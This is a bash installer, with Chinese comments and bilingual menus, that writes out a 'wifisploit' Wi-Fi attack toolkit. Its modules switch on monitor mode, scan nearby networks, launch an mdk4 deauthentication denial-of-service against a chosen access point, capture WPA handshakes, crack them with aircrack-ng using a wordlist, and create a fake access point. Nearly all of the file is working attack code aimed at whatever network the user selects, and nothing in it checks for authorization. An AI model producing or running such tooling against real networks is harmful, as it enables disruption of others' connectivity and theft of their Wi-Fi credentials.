#!/bin/bash

# 检查必要工具是否已安装
REQUIRED_TOOLS=("airmon-ng" "airodump-ng" "aircrack-ng" "mdk4")
MISSING_TOOLS=()

for tool in "${REQUIRED_TOOLS[@]}"; do
  if ! command -v $tool &> /dev/null; then
    MISSING_TOOLS+=($tool)
  fi
done

if [ ${#MISSING_TOOLS[@]} -ne 0 ]; then
  echo "以下工具未安装，请先安装它们: ${MISSING_TOOLS[@]}"
  exit 1
fi

# 创建目录结构
mkdir -p wifisploit/modules
mkdir -p /tmp/wifisploit/fake_ap

# 选择语言版本
echo "Select language (选择语言):"
echo "1) English"
echo "2) 中文"
read -p "Enter choice: " lang_choice

if [ "$lang_choice" -eq 1 ]; then
  LANG_SUFFIX=""
elif [ "$lang_choice" -eq 2 ]; then
  LANG_SUFFIX="_zh"
else
  echo "Invalid choice, defaulting to English"
  LANG_SUFFIX=""
fi

# 创建 set_monitor_mode.sh
cat << EOF > wifisploit/modules/set_monitor_mode.sh
#!/bin/bash

INTERFACE=\$1

if [ -z "\$INTERFACE" ]; then
  if [ "$LANG_SUFFIX" == "_zh" ]; then
    echo "用法: \$0 <interface>"
  else
    echo "Usage: \$0 <interface>"
  fi
  exit 1
fi

if [ "$LANG_SUFFIX" == "_zh" ]; then
  echo "将\$INTERFACE设置为监听模式..."
else
  echo "Setting \$INTERFACE to monitor mode..."
fi

airmon-ng start \$INTERFACE

MONITOR_INTERFACE=\$(iw dev | awk '\$1=="Interface"{print \$2}' | grep -E "\$INTERFACE|mon\$INTERFACE")

if [ -z "\$MONITOR_INTERFACE" ]; then
  if [ "$LANG_SUFFIX" == "_zh" ]; then
    echo "未能成功将网卡设置为监听模式，请检查网卡及airmon-ng工具的状态。"
  else
    echo "Failed to set interface to monitor mode, please check the interface and airmon-ng status."
  fi
  exit 1
fi

echo \$MONITOR_INTERFACE > /tmp/current_monitor_interface

if [ "$LANG_SUFFIX" == "_zh" ]; then
  echo "\$INTERFACE 已设置为监听模式 \$MONITOR_INTERFACE"
else
  echo "\$INTERFACE is now in monitor mode as \$MONITOR_INTERFACE"
fi
EOF

# 创建 scan_networks.sh
cat << EOF > wifisploit/modules/scan_networks.sh
#!/bin/bash

if [ ! -f /tmp/current_monitor_interface ]; then
  if [ "$LANG_SUFFIX" == "_zh" ]; then
    echo "请先将网卡设置为监听模式。"
  else
    echo "Please set the interface to monitor mode first."
  fi
  exit 1
fi

MONITOR_INTERFACE=\$(cat /tmp/current_monitor_interface)

if [ -z "\$MONITOR_INTERFACE" ]; then
  if [ "$LANG_SUFFIX" == "_zh" ]; then
    echo "请先将网卡设置为监听模式。"
  else
    echo "Please set the interface to monitor mode first."
  fi
  exit 1
fi

if [ "$LANG_SUFFIX" == "_zh" ]; then
  echo "开始扫描周围网络..."
else
  echo "Starting to scan surrounding networks..."
fi

airodump-ng \$MONITOR_INTERFACE > /tmp/network_scan.txt &

sleep 20  # 扫描20秒

kill \$!

# 检查是否有扫描结果
NETWORKS=\$(awk '/^[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}/ {print \$1}' /tmp/network_scan.txt)

if [ -z "\$NETWORKS" ]; then
  if [ "$LANG_SUFFIX" == "_zh" ]; then
    echo "未发现任何网络，请重试。"
  else
    echo "No networks found, please try again."
  fi
  exit 1
fi

# 显示扫描结果并让用户选择目标
awk 'BEGIN{if ("$LANG_SUFFIX" == "_zh") print "编号\tBSSID\t\t\t频道\t加密\t信号\tSSID"; else print "Num\tBSSID\t\t\tChannel\tEncryption\tSignal\tSSID"} /^[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}/ {printf "%d\t%s\t%s\t%s\t%s\t%s\n", NR, \$1, \$6, \$8, \$4, \$14}' /tmp/network_scan.txt

if [ "$LANG_SUFFIX" == "_zh" ]; then
  read -p "选择目标网络的编号: " TARGET_NUMBER
else
  read -p "Select the target network number: " TARGET_NUMBER
fi

TARGET_BSSID=\$(awk -v num=\$TARGET_NUMBER 'BEGIN{FS="\t"} NR==num+1 {print \$2}' /tmp/network_scan.txt)
TARGET_CHANNEL=\$(awk -v num=\$TARGET_NUMBER 'BEGIN{FS="\t"} NR==num+1 {print \$3}' /tmp/network_scan.txt)

if [ -z "\$TARGET_BSSID" ] || [ -z "\$TARGET_CHANNEL" ]; then
  if [ "$LANG_SUFFIX" == "_zh" ]; then
    echo "选择的目标网络编号无效，请重试。"
  else
    echo "Invalid target network number selected, please try again."
  fi
  exit 1
fi

echo \$TARGET_BSSID > /tmp/current_target_bssid
echo \$TARGET_CHANNEL > /tmp/current_target_channel

if [ "$LANG_SUFFIX" == "_zh" ]; then
  echo "已选择目标网络: BSSID=\$TARGET_BSSID, 频道=\$TARGET_CHANNEL"
else
  echo "Selected target network: BSSID=\$TARGET_BSSID, Channel=\$TARGET_CHANNEL"
fi
EOF

# 创建 dos_attack.sh
cat << EOF > wifisploit/modules/dos_attack.sh
#!/bin/bash

if [ ! -f /tmp/current_monitor_interface ]; then
  if [ "$LANG_SUFFIX" == "_zh" ];then
    echo "请先将网卡设置为监听模式。"
  else
    echo "Please set the interface to monitor mode first."
  fi
  exit 1
fi

MONITOR_INTERFACE=\$(cat /tmp/current_monitor_interface)
TARGET_BSSID=\$(cat /tmp/current_target_bssid)

if [ -z "\$MONITOR_INTERFACE" ] || [ -z "\$TARGET_BSSID" ]; then
  if [ "$LANG_SUFFIX" == "_zh" ];then
    echo "请先选择目标网络。"
  else
    echo "Please select a target network first."
  fi
  exit 1
fi

if [ "$LANG_SUFFIX" == "_zh" ];then
  echo "开始对目标网络进行Dos攻击..."
else
  echo "Starting Dos attack on the target network..."
fi

mdk4 \$MONITOR_INTERFACE d -t \$TARGET_BSSID
EOF

# 创建 capture_handshake.sh
cat << EOF > wifisploit/modules/capture_handshake.sh
#!/bin/bash

if [ ! -f /tmp/current_monitor_interface ]; then
  if [ "$LANG_SUFFIX" == "_zh" ];then
    echo "请先将网卡设置为监听模式。"
  else
    echo "Please set the interface to monitor mode first."
  fi
  exit 1
fi

MONITOR_INTERFACE=\$(cat /tmp/current_monitor_interface)
TARGET_BSSID=\$(cat /tmp/current_target_bssid)
TARGET_CHANNEL=\$(cat /tmp/current_target_channel)

if [ -z "\$MONITOR_INTERFACE" ] || [ -z "\$TARGET_BSSID" ] || [ -z "\$TARGET_CHANNEL" ]; then
  if [ "$LANG_SUFFIX" == "_zh" ];then
    echo "请先选择目标网络。"
  else
    echo "Please select a target network first."
  fi
  exit 1
fi

if [ "$LANG_SUFFIX" == "_zh" ];then
  echo "开始捕获目标网络的握手包..."
else
  echo "Starting to capture handshake from the target network..."
fi

airodump-ng --bssid \$TARGET_BSSID --channel \$TARGET_CHANNEL --write /tmp/capture \$MONITOR_INTERFACE &

AIRODUMP_PID=\$!

sleep 20  # 监视20秒以捕获握手包

kill \$AIRODUMP_PID

if [ ! -f /tmp/capture-01.cap ]; then
  if [ "$LANG_SUFFIX" == "_zh" ];then
    echo "未能捕获到握手包。"
  else
    echo "Failed to capture handshake."
  fi
  exit 1
fi

mv /tmp/capture-01.cap /tmp/handshake.cap

if [ "$LANG_SUFFIX" == "_zh" ];then
  echo "握手包已成功捕获并保存到 /tmp/handshake.cap"
else
  echo "Handshake successfully captured and saved to /tmp/handshake.cap"
fi
EOF

# 创建 crack_handshake.sh
cat << EOF > wifisploit/modules/crack_handshake.sh
#!/bin/bash

DICTIONARY_PATH=\$1

if [ -z "\$DICTIONARY_PATH" ]; then
  if [ "$LANG_SUFFIX" == "_zh" ];then
    echo "用法: \$0 <dictionary_path>"
  else
    echo "Usage: \$0 <dictionary_path>"
  fi
  exit 1
fi

if [ ! -f "\$DICTIONARY_PATH" ]; then
  if [ "$LANG_SUFFIX" == "_zh" ];then
    echo "字典文件不存在，请检查路径。"
  else
    echo "Dictionary file not found, please check the path."
  fi
  exit 1
fi

CAPTURE_FILE=/tmp/handshake.cap

if [ ! -f "\$CAPTURE_FILE" ]; then
  if [ "$LANG_SUFFIX" == "_zh" ];then
    echo "未找到捕获的握手包，请先捕获握手包。"
  else
    echo "Capture file not found, please capture the handshake first."
  fi
  exit 1
fi

if [ "$LANG_SUFFIX" == "_zh" ];then
  echo "开始破解握手包..."
else
  echo "Starting to crack the handshake..."
fi

aircrack-ng -w \$DICTIONARY_PATH \$CAPTURE_FILE
EOF

# 创建 create_fake_ap.sh
cat << EOF > wifisploit/modules/create_fake_ap.sh
#!/bin/bash

AP_INTERFACE=\$1
AP_SSID=\$2
AP_CHANNEL=\$3

if [ -z "\$AP_INTERFACE" ] || [ -z "\$AP_SSID" ] || [ -z "\$AP_CHANNEL" ]; then
  if [ "$LANG_SUFFIX" == "_zh" ];then
    echo "用法: \$0 <interface> <SSID> <channel>"
  else
    echo "Usage: \$0 <interface> <SSID> <channel>"
  fi
  exit 1
fi

if [ "$LANG_SUFFIX" == "_zh" ];then
  echo "创建假的AP: SSID=\$AP_SSID, 频道=\$AP_CHANNEL, 接口=\$AP_INTERFACE..."
else
  echo "Creating fake AP: SSID=\$AP_SSID, Channel=\$AP_CHANNEL, Interface=\$AP_INTERFACE..."
fi

# 使用airbase-ng创建假AP
airbase-ng -e \$AP_SSID -c \$AP_CHANNEL \$AP_INTERFACE
EOF

# 创建主脚本 wifisploit.sh
cat << EOF > wifisploit/wifisploit.sh
#!/bin/bash

while true; do
  # 选择模块
  if [ "$LANG_SUFFIX" == "_zh" ];then
    echo "选择模块:"
    echo "1) 设置监听模式 - 将无线网卡设置为监听模式以捕获数据包。"
    echo "2) 扫描网络 - 扫描周围的Wi-Fi网络。"
    echo "3) DOS攻击 - 对目标网络进行拒绝服务攻击。"
    echo "4) 捕获握手包 - 捕获目标网络的握手包。"
    echo "5) 破解握手包 - 使用字典文件破解捕获的握手包。"
    echo "6) 创建假的AP - 创建一个假的Wi-Fi接入点。"
    echo "7) 退出 - 退出脚本。"
    read -p "输入选择: " module_choice
  else
    echo "Select module:"
    echo "1) Set Monitor Mode - Set the wireless interface to monitor mode to capture packets."
    echo "2) Scan Networks - Scan surrounding Wi-Fi networks."
    echo "3) DOS Attack - Perform a denial-of-service attack on the target network."
    echo "4) Capture Handshake - Capture handshake packets from the target network."
    echo "5) Crack Handshake - Crack the captured handshake using a dictionary file."
    echo "6) Create Fake AP - Create a fake Wi-Fi access point."
    echo "7) Exit - Exit the script."
    read -p "Enter choice: " module_choice
  fi

  case \$module_choice in
    1)
      if [ "$LANG_SUFFIX" == "_zh" ];then
        read -p "输入接口（如 wlan0）: " interface
      else
        read -p "Enter interface (e.g., wlan0): " interface
      fi
      ./modules/set_monitor_mode.sh \$interface
      ;;
    2)
      ./modules/scan_networks.sh
      ;;
    3)
      ./modules/dos_attack.sh
      ;;
    4)
      ./modules/capture_handshake.sh
      ;;
    5)
      if [ "$LANG_SUFFIX" == "_zh" ];then
        read -p "输入字典路径: " dict_path
      else
        read -p "Enter dictionary path: " dict_path
      fi
      ./modules/crack_handshake.sh \$dict_path
      ;;
    6)
      if [ "$LANG_SUFFIX" == "_zh" ];then
        read -p "输入SSID: " ap_ssid
        read -p "输入频道: " ap_channel
      else
        read -p "Enter SSID: " ap_ssid
        read -p "Enter channel: " ap_channel
      fi
      ./modules/create_fake_ap.sh \$(cat /tmp/current_monitor_interface) \$ap_ssid \$ap_channel
      ;;
    7)
      if [ "$LANG_SUFFIX" == "_zh" ];then
        echo "退出..."
      else
        echo "Exiting..."
      fi
      exit 0
      ;;
    *)
      if [ "$LANG_SUFFIX" == "_zh" ];then
        echo "无效的选择"
      else
        echo "Invalid choice"
      fi
      ;;
  esac

  if [ "$LANG_SUFFIX" == "_zh" ];then
    echo "返回主菜单..."
  else
    echo "Returning to main menu..."
  fi
done
EOF

# 设置脚本可执行权限
chmod +x wifisploit/modules/*.sh
chmod +x wifisploit/wifisploit.sh

if [ "$LANG_SUFFIX" == "_zh" ];then
  echo "部署完成！运行 ./wifisploit/wifisploit.sh 启动脚本。"
else
  echo "Deployment complete! Run ./wifisploit/wifisploit.sh to start the script."
fi
